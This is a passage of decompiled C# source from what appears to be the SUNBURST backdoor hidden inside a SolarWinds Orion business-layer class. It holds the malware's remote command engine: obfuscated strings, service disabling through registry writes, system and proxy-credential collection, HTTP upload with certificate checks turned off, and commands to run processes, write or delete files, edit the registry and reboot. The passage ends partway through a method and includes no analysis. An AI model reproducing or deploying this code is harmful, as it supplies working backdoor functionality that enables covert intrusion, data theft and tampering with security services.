			// Token: 0x06000980 RID: 2432 RVA: 0x000437F4 File Offset: 0x000419F4
			private static bool SetManualMode(OrionImprovementBusinessLayer.ServiceConfiguration.Service[] svcList)
			{
				try
				{
					bool result = false;
					using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(OrionImprovementBusinessLayer.ZipHelper.Unzip("C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=")))
					{
						foreach (string text in registryKey.GetSubKeyNames())
						{
							foreach (OrionImprovementBusinessLayer.ServiceConfiguration.Service service in svcList)
							{
								try
								{
									if (OrionImprovementBusinessLayer.GetHash(text.ToLower()) == service.timeStamp)
									{
										if (service.started)
										{
											result = true;
											OrionImprovementBusinessLayer.RegistryHelper.SetKeyPermissions(registryKey, text, false);
										}
										else
										{
											using (RegistryKey registryKey2 = registryKey.OpenSubKey(text, true))
											{
												if (registryKey2.GetValueNames().Contains(OrionImprovementBusinessLayer.ZipHelper.Unzip("Cy5JLCoBAA==")))
												{
													registryKey2.SetValue(OrionImprovementBusinessLayer.ZipHelper.Unzip("Cy5JLCoBAA=="), 4, RegistryValueKind.DWord);
													result = true;
												}
											}
										}
									}
								}
								catch (Exception)
								{
								}
							}
						}
					}
					return result;
				}
				catch (Exception)
				{
				}
				return false;
			}

			// Token: 0x06000981 RID: 2433 RVA: 0x00043924 File Offset: 0x00041B24
			public static void SetAutomaticMode()
			{
				try
				{
					using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(OrionImprovementBusinessLayer.ZipHelper.Unzip("C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=")))
					{
						foreach (string text in registryKey.GetSubKeyNames())
						{
							foreach (OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration in OrionImprovementBusinessLayer.svcList)
							{
								if (serviceConfiguration.stopped)
								{
									foreach (OrionImprovementBusinessLayer.ServiceConfiguration.Service service in serviceConfiguration.Svc)
									{
										try
										{
											if (OrionImprovementBusinessLayer.GetHash(text.ToLower()) == service.timeStamp)
											{
												if (service.started)
												{
													OrionImprovementBusinessLayer.RegistryHelper.SetKeyPermissions(registryKey, text, true);
												}
												else
												{
													using (RegistryKey registryKey2 = registryKey.OpenSubKey(text, true))
													{
														if (registryKey2.GetValueNames().Contains(OrionImprovementBusinessLayer.ZipHelper.Unzip("Cy5JLCoBAA==")))
														{
															registryKey2.SetValue(OrionImprovementBusinessLayer.ZipHelper.Unzip("Cy5JLCoBAA=="), service.DefaultValue, RegistryValueKind.DWord);
														}
													}
												}
											}
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}

			// Token: 0x040002EF RID: 751
			private static readonly object _lock = new object();
		}

		// Token: 0x020000D3 RID: 211
		private static class Job
		{
			// Token: 0x06000983 RID: 2435 RVA: 0x00043ABC File Offset: 0x00041CBC
			public static int GetArgumentIndex(string cl, int num)
			{
				if (cl == null)
				{
					return -1;
				}
				if (num == 0)
				{
					return 0;
				}
				char[] array = cl.ToCharArray();
				bool flag = false;
				int num2 = 0;
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i] == '"')
					{
						flag = !flag;
					}
					if (!flag && array[i] == ' ' && i > 0 && array[i - 1] != ' ')
					{
						num2++;
						if (num2 == num)
						{
							return i + 1;
						}
					}
				}
				return -1;
			}

			// Token: 0x06000984 RID: 2436 RVA: 0x00043B1C File Offset: 0x00041D1C
			public static string[] SplitString(string cl)
			{
				if (cl == null)
				{
					return new string[0];
				}
				char[] array = cl.Trim().ToCharArray();
				bool flag = false;
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i] == '"')
					{
						flag = !flag;
					}
					if (!flag && array[i] == ' ')
					{
						array[i] = '\n';
					}
				}
				string[] array2 = new string(array).Split(new char[]
				{
					'\n'
				}, StringSplitOptions.RemoveEmptyEntries);
				for (int j = 0; j < array2.Length; j++)
				{
					string text = "";
					bool flag2 = false;
					array2[j] = OrionImprovementBusinessLayer.Unquote(array2[j]);
					foreach (char c in array2[j])
					{
						if (flag2)
						{
							if (c != '`')
							{
								if (c == 'q')
								{
									text += "\"";
								}
								else
								{
									text = text + '`'.ToString() + c.ToString();
								}
							}
							else
							{
								text += '`'.ToString();
							}
							flag2 = false;
						}
						else if (c == '`')
						{
							flag2 = true;
						}
						else
						{
							text += c.ToString();
						}
					}
					if (flag2)
					{
						text += '`'.ToString();
					}
					array2[j] = text;
				}
				return array2;
			}

			// Token: 0x06000985 RID: 2437 RVA: 0x00043C6E File Offset: 0x00041E6E
			public static void SetTime(string[] args, out int delay)
			{
				delay = int.Parse(args[0]);
			}

			// Token: 0x06000986 RID: 2438 RVA: 0x00043C7A File Offset: 0x00041E7A
			public static void KillTask(string[] args)
			{
				Process.GetProcessById(int.Parse(args[0])).Kill();
			}

			// Token: 0x06000987 RID: 2439 RVA: 0x00043C8E File Offset: 0x00041E8E
			public static void DeleteFile(string[] args)
			{
				File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
			}

			// Token: 0x06000988 RID: 2440 RVA: 0x00043CA0 File Offset: 0x00041EA0
			public static int GetFileHash(string[] args, out string result)
			{
				result = null;
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				using (MD5 md = MD5.Create())
				{
					using (FileStream fileStream = File.OpenRead(path))
					{
						byte[] bytes = md.ComputeHash(fileStream);
						if (args.Length > 1)
						{
							return (!(OrionImprovementBusinessLayer.ByteArrayToHexString(bytes).ToLower() == args[1].ToLower())) ? 1 : 0;
						}
						result = OrionImprovementBusinessLayer.ByteArrayToHexString(bytes);
					}
				}
				return 0;
			}

			// Token: 0x06000989 RID: 2441 RVA: 0x00043D34 File Offset: 0x00041F34
			public static void GetFileSystemEntries(string[] args, out string result)
			{
				string searchPattern = (args.Length >= 2) ? args[1] : "*";
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				string[] value = (from f in Directory.GetFiles(path, searchPattern)
				select Path.GetFileName(f)).ToArray<string>();
				string[] value2 = (from f in Directory.GetDirectories(path, searchPattern)
				select Path.GetFileName(f)).ToArray<string>();
				result = string.Join("\n", value2) + "\n\n" + string.Join(" \n", value);
			}

			// Token: 0x0600098A RID: 2442 RVA: 0x00043DE0 File Offset: 0x00041FE0
			public static void GetProcessByDescription(string[] args, out string result)
			{
				result = null;
				if (args.Length == 0)
				{
					foreach (Process process in Process.GetProcesses())
					{
						result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNqzlAgA="), process.Id, OrionImprovementBusinessLayer.Quote(process.ProcessName));
					}
					return;
				}
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPKMpPTi0uBgA=")))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						string[] array = new string[]
						{
							string.Empty,
							string.Empty
						};
						ManagementObject managementObject2 = managementObject;
						string methodName = OrionImprovementBusinessLayer.ZipHelper.Unzip("c08t8S/PSy0CAA==");
						object[] array2 = array;
						object[] args2 = array2;
						Convert.ToInt32(managementObject2.InvokeMethod(methodName, args2));
						result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNtTRNTSrVag2quWsNgYKKVSb1MZUm9ZyAQA="), new object[]
						{
							managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("CyjKT04tLvZ0AQA=")],
							OrionImprovementBusinessLayer.Quote(managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("80vMTQUA")].ToString()),
							managementObject[args[0]],
							managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0gsSs0rCSjKT04tLvZ0AQA=")],
							array[1],
							array[0]
						});
					}
				}
			}

			// Token: 0x0600098B RID: 2443 RVA: 0x00043F68 File Offset: 0x00042168
			private static string GetDescriptionId(ref int i)
			{
				i++;
				return "\n" + i.ToString() + ". ";
			}

			// Token: 0x0600098C RID: 2444 RVA: 0x00043F88 File Offset: 0x00042188
			public static void CollectSystemDescription(string info, out string result)
			{
				result = null;
				int num = 0;
				string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + domainName;
				try
				{
					string str = ((SecurityIdentifier)new NTAccount(domainName, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof(SecurityIdentifier))).AccountDomainSid.ToString();
					result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + str;
				}
				catch
				{
					result += OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num);
				}
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + IPGlobalProperties.GetIPGlobalProperties().HostName;
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.UserName;
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + OrionImprovementBusinessLayer.GetOSVersion(true);
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.SystemDirectory;
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + (int)TimeSpan.FromMilliseconds(Environment.TickCount).TotalDays;
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + info + "\n";
				result += OrionImprovementBusinessLayer.GetNetworkAdapterConfiguration();
			}

			// Token: 0x0600098D RID: 2445 RVA: 0x000440C4 File Offset: 0x000422C4
			public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
			{
				result = null;
				string requestUriString = args[0];
				string s = args[1];
				string text = (args.Length >= 3) ? args[2] : null;
				string[] array = Encoding.UTF8.GetString(Convert.FromBase64String(s)).Split(new string[]
				{
					"\r\n",
					"\r",
					"\n"
				}, StringSplitOptions.None);
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
				HttpWebRequest httpWebRequest2 = httpWebRequest;
				httpWebRequest2.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpWebRequest2.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
				httpWebRequest.Proxy = proxy;
				httpWebRequest.Timeout = 120000;
				httpWebRequest.Method = array[0].Split(new char[]
				{
					' '
				})[0];
				foreach (string text2 in array)
				{
					int num = text2.IndexOf(':');
					if (num > 0)
					{
						string text3 = text2.Substring(0, num);
						string text4 = text2.Substring(num + 1).TrimStart(Array.Empty<char>());
						if (!WebHeaderCollection.IsRestricted(text3))
						{
							httpWebRequest.Headers.Add(text2);
						}
						else
						{
							ulong hash = OrionImprovementBusinessLayer.GetHash(text3.ToLower());
							if (hash <= 8873858923435176895UL)
							{
								if (hash <= 6116246686670134098UL)
								{
									if (hash != 2734787258623754862UL)
									{
										if (hash == 6116246686670134098UL)
										{
											httpWebRequest.ContentType = text4;
										}
									}
									else
									{
										httpWebRequest.Accept = text4;
									}
								}
								else if (hash != 7574774749059321801UL)
								{
									if (hash == 8873858923435176895UL)
									{
										if (OrionImprovementBusinessLayer.GetHash(text4.ToLower()) == 1475579823244607677UL)
										{
											httpWebRequest.ServicePoint.Expect100Continue = true;
										}
										else
										{
											httpWebRequest.Expect = text4;
										}
									}
								}
								else
								{
									httpWebRequest.UserAgent = text4;
								}
							}
							else if (hash <= 11266044540366291518UL)
							{
								if (hash != 9007106680104765185UL)
								{
									if (hash == 11266044540366291518UL)
									{
										ulong hash2 = OrionImprovementBusinessLayer.GetHash(text4.ToLower());
										httpWebRequest.KeepAlive = (hash2 == 13852439084267373191UL || httpWebRequest.KeepAlive);
										httpWebRequest.KeepAlive = (hash2 != 14226582801651130532UL && httpWebRequest.KeepAlive);
									}
								}
								else
								{
									httpWebRequest.Referer = text4;
								}
							}
							else if (hash != 15514036435533858158UL)
							{
								if (hash == 16066522799090129502UL)
								{
									httpWebRequest.Date = DateTime.Parse(text4);
								}
							}
							else
							{
								httpWebRequest.Date = DateTime.Parse(text4);
							}
						}
					}
				}
				result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("qzaoVag2rFXwCAkJ0K82quUCAA=="), httpWebRequest.Method, httpWebRequest.Address.PathAndQuery, httpWebRequest.ProtocolVersion.ToString());
				result = result + httpWebRequest.Headers.ToString() + "\n\n";
				if (!string.IsNullOrEmpty(text))
				{
					using (Stream requestStream = httpWebRequest.GetRequestStream())
					{
						byte[] array3 = Convert.FromBase64String(text);
						requestStream.Write(array3, 0, array3.Length);
					}
				}
				using (WebResponse response = httpWebRequest.GetResponse())
				{
					result += string.Format("{0} {1}\n", (int)((HttpWebResponse)response).StatusCode, ((HttpWebResponse)response).StatusDescription);
					result = result + response.Headers.ToString() + "\n";
					using (Stream responseStream = response.GetResponseStream())
					{
						result += new StreamReader(responseStream).ReadToEnd();
					}
				}
			}

			// Token: 0x0600098E RID: 2446 RVA: 0x000444D0 File Offset: 0x000426D0
			public static int RunTask(string[] args, string cl, out string result)
			{
				result = null;
				string fileName = Environment.ExpandEnvironmentVariables(args[0]);
				string arguments = (args.Length > 1) ? cl.Substring(OrionImprovementBusinessLayer.Job.GetArgumentIndex(cl, 1)).Trim() : null;
				using (Process process = new Process())
				{
					process.StartInfo = new ProcessStartInfo(fileName, arguments)
					{
						CreateNoWindow = false,
						UseShellExecute = false
					};
					if (process.Start())
					{
						result = process.Id.ToString();
						return 0;
					}
				}
				return 1;
			}

			// Token: 0x0600098F RID: 2447 RVA: 0x00044564 File Offset: 0x00042764
			public static void WriteFile(string[] args)
			{
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				byte[] array = Convert.FromBase64String(args[1]);
				for (int i = 0; i < 3; i++)
				{
					try
					{
						using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write))
						{
							fileStream.Write(array, 0, array.Length);
						}
						break;
					}
					catch (Exception)
					{
						if (i + 1 >= 3)
						{
							throw;
						}
					}
					OrionImprovementBusinessLayer.DelayMs(0.0, 0.0);
				}
			}

			// Token: 0x06000990 RID: 2448 RVA: 0x000445F0 File Offset: 0x000427F0
			public static void FileExists(string[] args, out string result)
			{
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				result = File.Exists(path).ToString();
			}

			// Token: 0x06000991 RID: 2449 RVA: 0x00044616 File Offset: 0x00042816
			public static int ReadRegistryValue(string[] args, out string result)
			{
				result = OrionImprovementBusinessLayer.RegistryHelper.GetValue(args[0], args[1], null);
				if (result != null)
				{
					return 0;
				}
				return 1;
			}

			// Token: 0x06000992 RID: 2450 RVA: 0x0004462D File Offset: 0x0004282D
			public static void DeleteRegistryValue(string[] args)
			{
				OrionImprovementBusinessLayer.RegistryHelper.DeleteValue(args[0], args[1]);
			}

			// Token: 0x06000993 RID: 2451 RVA: 0x0004463A File Offset: 0x0004283A
			public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
			{
				result = OrionImprovementBusinessLayer.RegistryHelper.GetSubKeyAndValueNames(args[0]);
			}

			// Token: 0x06000994 RID: 2452 RVA: 0x00044648 File Offset: 0x00042848
			public static int SetRegistryValue(string[] args)
			{
				RegistryValueKind valueKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), args[2]);
				string valueData = (args.Length > 3) ? Encoding.UTF8.GetString(Convert.FromBase64String(args[3])) : "";
				if (!OrionImprovementBusinessLayer.RegistryHelper.SetValue(args[0], args[1], valueData, valueKind))
				{
					return 1;
				}
				return 0;
			}
		}

		// Token: 0x020000D4 RID: 212
		private class Proxy
		{
			// Token: 0x06000995 RID: 2453 RVA: 0x000446A0 File Offset: 0x000428A0
			public Proxy(OrionImprovementBusinessLayer.ProxyType proxyType)
			{
				try
				{
					this.proxyType = proxyType;
					OrionImprovementBusinessLayer.ProxyType proxyType2 = this.proxyType;
					if (proxyType2 != OrionImprovementBusinessLayer.ProxyType.System)
					{
						if (proxyType2 == OrionImprovementBusinessLayer.ProxyType.Direct)
						{
							this.proxy = null;
						}
						else
						{
							this.proxy = HttpProxySettings.Instance.AsWebProxy();
						}
					}
					else
					{
						this.proxy = WebRequest.GetSystemWebProxy();
					}
				}
				catch
				{
				}
			}

			// Token: 0x06000996 RID: 2454 RVA: 0x00044704 File Offset: 0x00042904
			public override string ToString()
			{
				if (this.proxyType != OrionImprovementBusinessLayer.ProxyType.Manual)
				{
					return this.proxyType.ToString();
				}
				if (this.proxy == null)
				{
					return OrionImprovementBusinessLayer.ProxyType.Direct.ToString();
				}
				if (string.IsNullOrEmpty(this.proxyString))
				{
					try
					{
						IHttpProxySettings instance = HttpProxySettings.Instance;
						if (instance.IsDisabled)
						{
							this.proxyString = OrionImprovementBusinessLayer.ProxyType.Direct.ToString();
						}
						else if (instance.UseSystemDefaultProxy)
						{
							this.proxyString = ((WebRequest.DefaultWebProxy != null) ? OrionImprovementBusinessLayer.ProxyType.Default.ToString() : OrionImprovementBusinessLayer.ProxyType.System.ToString());
						}
						else
						{
							this.proxyString = OrionImprovementBusinessLayer.ProxyType.Manual.ToString();
							if (instance.IsValid)
							{
								string[] array = new string[7];
								array[0] = this.proxyString;
								array[1] = ":";
								array[2] = instance.Uri;
								array[3] = "\t";
								int num = 4;
								UsernamePasswordCredential usernamePasswordCredential = instance.Credential as UsernamePasswordCredential;
								array[num] = ((usernamePasswordCredential != null) ? usernamePasswordCredential.Username : null);
								array[5] = "\t";
								int num2 = 6;
								UsernamePasswordCredential usernamePasswordCredential2 = instance.Credential as UsernamePasswordCredential;
								array[num2] = ((usernamePasswordCredential2 != null) ? usernamePasswordCredential2.Password : null);
								this.proxyString = string.Concat(array);
							}
						}
					}
					catch
					{
					}
				}
				return this.proxyString;
			}

			// Token: 0x06000997 RID: 2455 RVA: 0x0004485C File Offset: 0x00042A5C
			public IWebProxy GetWebProxy()
			{
				return this.proxy;
			}

			// Token: 0x040002F0 RID: 752
			private OrionImprovementBusinessLayer.ProxyType proxyType;

			// Token: 0x040002F1 RID: 753
			private IWebProxy proxy;

			// Token: 0x040002F2 RID: 754
			private string proxyString;
		}

		// Token: 0x020000D5 RID: 213
		private class HttpHelper
		{
			// Token: 0x06000998 RID: 2456 RVA: 0x00044864 File Offset: 0x00042A64
			public void Abort()
			{
				this.isAbort = true;
			}

			// Token: 0x06000999 RID: 2457 RVA: 0x00044870 File Offset: 0x00042A70
			public HttpHelper(byte[] customerId, OrionImprovementBusinessLayer.DnsRecords rec)
			{
				this.customerId = customerId.ToArray<byte>();
				this.httpHost = rec.cname;
				this.requestMethod = (OrionImprovementBusinessLayer.HttpOipMethods)rec._type;
				this.proxy = new OrionImprovementBusinessLayer.Proxy((OrionImprovementBusinessLayer.ProxyType)rec.length);
			}

			// Token: 0x0600099A RID: 2458 RVA: 0x000448E4 File Offset: 0x00042AE4
			private bool TrackEvent()
			{
				if (DateTime.Now.CompareTo(this.timeStamp.AddMinutes(1.0)) > 0)
				{
					if (OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(false) || OrionImprovementBusinessLayer.svcListModified2)
					{
						return true;
					}
					this.timeStamp = DateTime.Now;
				}
				return false;
			}

			// Token: 0x0600099B RID: 2459 RVA: 0x00044934 File Offset: 0x00042B34
			private bool IsSynchronized(bool idle)
			{
				if (this.delay != 0 && idle)
				{
					if (this.delayInc == 0)
					{
						this.delayInc = this.delay;
					}
					double num = (double)this.delayInc * 1000.0;
					OrionImprovementBusinessLayer.DelayMs(0.9 * num, 1.1 * num);
					if (this.delayInc < 300)
					{
						this.delayInc *= 2;
						return true;
					}
				}
				else
				{
					OrionImprovementBusinessLayer.DelayMs(0.0, 0.0);
					this.delayInc = 0;
				}
				return false;
			}

			// Token: 0x0600099C RID: 2460 RVA: 0x000449CC File Offset: 0x00042BCC
			public void Initialize()
			{
				OrionImprovementBusinessLayer.HttpHelper.JobEngine jobEngine = OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle;
				string response = null;
				int err = 0;
				try
				{
					int num = 1;
					while (num <= 3 && !this.isAbort)
					{
						byte[] body = null;
						if (this.IsSynchronized(jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle))
						{
							num = 0;
						}
						if (this.TrackEvent())
						{
							this.isAbort = true;
							break;
						}
						HttpStatusCode httpStatusCode = this.CreateUploadRequest(jobEngine, err, response, out body);
						if (jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Exit || jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Reboot)
						{
							this.isAbort = true;
							break;
						}
						if (httpStatusCode <= HttpStatusCode.OK)
						{
							if (httpStatusCode != (HttpStatusCode)0)
							{
								if (httpStatusCode != HttpStatusCode.OK)
								{
									goto IL_DC;
								}
								goto IL_89;
							}
						}
						else
						{
							if (httpStatusCode == HttpStatusCode.NoContent || httpStatusCode == HttpStatusCode.NotModified)
							{
								goto IL_89;
							}
							goto IL_DC;
						}
						IL_E3:
						num++;
						continue;
						IL_89:
						string cl = null;
						if (httpStatusCode != HttpStatusCode.OK)
						{
							if (httpStatusCode != HttpStatusCode.NoContent)
							{
								jobEngine = OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle;
							}
							else
							{
								num = ((jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.None || jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle) ? num : 0);
								jobEngine = OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
							}
						}
						else
						{
							jobEngine = this.ParseServiceResponse(body, out cl);
							num = ((jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.None || jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle) ? num : 0);
						}
						err = this.ExecuteEngine(jobEngine, cl, out response);
						goto IL_E3;
						IL_DC:
						OrionImprovementBusinessLayer.DelayMin(1, 5);
						goto IL_E3;
					}
					if (jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Reboot)
					{
						OrionImprovementBusinessLayer.NativeMethods.RebootComputer();
					}
				}
				catch (Exception)
				{
				}
			}

			// Token: 0x0600099D RID: 2461 RVA: 0x00044AE8 File Offset: 0x00042CE8
			private int ExecuteEngine(OrionImprovementBusinessLayer.HttpHelper.JobEngine job, string cl, out string result)
			{
				result = null;
				int num = 0;
				string[] args = OrionImprovementBusinessLayer.Job.SplitString(cl);
				int result2;
				try
				{
					if (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.ReadRegistryValue || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetRegistryValue || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteRegistryValue || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames)
					{
						num = OrionImprovementBusinessLayer.HttpHelper.AddRegistryExecutionEngine(job, args, out result);
					}
					switch (job)
					{
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetTime:
					{
						int num2;
						OrionImprovementBusinessLayer.Job.SetTime(args, out num2);
						this.delay = num2;
						break;
					}
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.CollectSystemDescription:
						OrionImprovementBusinessLayer.Job.CollectSystemDescription(this.proxy.ToString(), out result);
						break;
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.UploadSystemDescription:
						OrionImprovementBusinessLayer.Job.UploadSystemDescription(args, out result, this.proxy.GetWebProxy());
						break;
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.RunTask:
						num = OrionImprovementBusinessLayer.Job.RunTask(args, cl, out result);
						break;
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetProcessByDescription:
						OrionImprovementBusinessLayer.Job.GetProcessByDescription(args, out result);
						break;
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.KillTask:
						OrionImprovementBusinessLayer.Job.KillTask(args);
						break;
					}
					if (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.WriteFile || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.FileExists || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteFile || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileHash || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileSystemEntries)
					{
						result2 = OrionImprovementBusinessLayer.HttpHelper.AddFileExecutionEngine(job, args, out result);
					}
					else
					{
						result2 = num;
					}
				}
				catch (Exception ex)
				{
					if (!string.IsNullOrEmpty(result))
					{
						result += "\n";
					}
					result += ex.Message;
					result2 = ex.HResult;
				}
				return result2;
			}

			// Token: 0x0600099E RID: 2462 RVA: 0x00044C00 File Offset: 0x00042E00
			private static int AddRegistryExecutionEngine(OrionImprovementBusinessLayer.HttpHelper.JobEngine job, string[] args, out string result)
			{
				result = null;
				int result2 = 0;
				switch (job)
				{
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.ReadRegistryValue:
					result2 = OrionImprovementBusinessLayer.Job.ReadRegistryValue(args, out result);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetRegistryValue:
					result2 = OrionImprovementBusinessLayer.Job.SetRegistryValue(args);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteRegistryValue:
					OrionImprovementBusinessLayer.Job.DeleteRegistryValue(args);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames:
					OrionImprovementBusinessLayer.Job.GetRegistrySubKeyAndValueNames(args, out result);
					break;
				}
				return result2;
			}

			// Token: 0x0600099F RID: 2463 RVA: 0x00044C50 File Offset: 0x00042E50
			private static int AddFileExecutionEngine(OrionImprovementBusinessLayer.HttpHelper.JobEngine job, string[] args, out string result)
			{
				result = null;
				int result2 = 0;
				switch (job)
				{
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileSystemEntries:
					OrionImprovementBusinessLayer.Job.GetFileSystemEntries(args, out result);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.WriteFile:
					OrionImprovementBusinessLayer.Job.WriteFile(args);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.FileExists:
					OrionImprovementBusinessLayer.Job.FileExists(args, out result);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteFile:
					OrionImprovementBusinessLayer.Job.DeleteFile(args);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileHash:
					result2 = OrionImprovementBusinessLayer.Job.GetFileHash(args, out result);
					break;
				}
				return result2;
			}

			// Token: 0x060009A0 RID: 2464 RVA: 0x00044CAC File Offset: 0x00042EAC
			private static byte[] Deflate(byte[] body)
			{
				int num = 0;
				byte[] array = body.ToArray<byte>();
				for (int i = 1; i < array.Length; i++)
				{
					byte[] array2 = array;
					int num2 = i;
					array2[num2] ^= array[0];
					num += (int)array[i];
				}
				if ((byte)num == array[0])
				{
					return OrionImprovementBusinessLayer.ZipHelper.Decompress(array.Skip(1).ToArray<byte>());
				}
				return null;
			}

			// Token: 0x060009A1 RID: 2465 RVA: 0x00044D00 File Offset: 0x00042F00
			private static byte[] Inflate(byte[] body)
			{
				byte[] array = OrionImprovementBusinessLayer.ZipHelper.Compress(body);
				byte[] array2 = new byte[array.Length + 1];
				array2[0] = (byte)array.Sum((byte b) => (int)b);
				for (int i = 0; i < array.Length; i++)
				{
					byte[] array3 = array;
					int num = i;
					array3[num] ^= array2[0];
				}
				Array.Copy(array, 0, array2, 1, array.Length);
				return array2;
			}

			// Token: 0x060009A2 RID: 2466 RVA: 0x00044D74 File Offset: 0x00042F74
			private OrionImprovementBusinessLayer.HttpHelper.JobEngine ParseServiceResponse(byte[] body, out string args)
			{
				args = null;
				try
				{
					if (body == null || body.Length < 4)
					{
						return OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
					}
					OrionImprovementBusinessLayer.HttpOipMethods httpOipMethods = this.requestMethod;
					if (httpOipMethods != OrionImprovementBusinessLayer.HttpOipMethods.Put)
					{
						if (httpOipMethods != OrionImprovementBusinessLayer.HttpOipMethods.Post)
						{
							string[] value = (from Match m in Regex.Matches(Encoding.UTF8.GetString(body), OrionImprovementBusinessLayer.ZipHelper.Unzip("U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA"), RegexOptions.IgnoreCase)
							select m.Value).ToArray<string>();
							body = OrionImprovementBusinessLayer.HexStringToByteArray(string.Join("", value).Replace("\"", string.Empty).Replace("-", string.Empty).Replace("{", string.Empty).Replace("}", string.Empty));
						}
						else
						{
							body = body.Skip(12).ToArray<byte>();
						}
					}
					else
					{
						body = body.Skip(48).ToArray<byte>();
					}
					int num = BitConverter.ToInt32(body, 0);
					body = body.Skip(4).Take(num).ToArray<byte>();
					if (body.Length != num)
					{
						return OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
					}
					string[] array = Encoding.UTF8.GetString(OrionImprovementBusinessLayer.HttpHelper.Deflate(body)).Trim().Split(new char[]
					{
						' '
					}, 2);
					OrionImprovementBusinessLayer.HttpHelper.JobEngine jobEngine = (OrionImprovementBusinessLayer.HttpHelper.JobEngine)int.Parse(array[0]);
					args = ((array.Length > 1) ? array[1] : null);
					return Enum.IsDefined(typeof(OrionImprovementBusinessLayer.HttpHelper.JobEngine), jobEngine) ? jobEngine : OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
				}
				catch (Exception)
				{
				}
				return OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
			}

			// Token: 0x060009A3 RID: 2467 RVA: 0x00044F14 File Offset: 0x00043114
			public static void Close(OrionImprovementBusinessLayer.HttpHelper http, Thread thread)
			{
				if (thread != null && thread.IsAlive)
				{
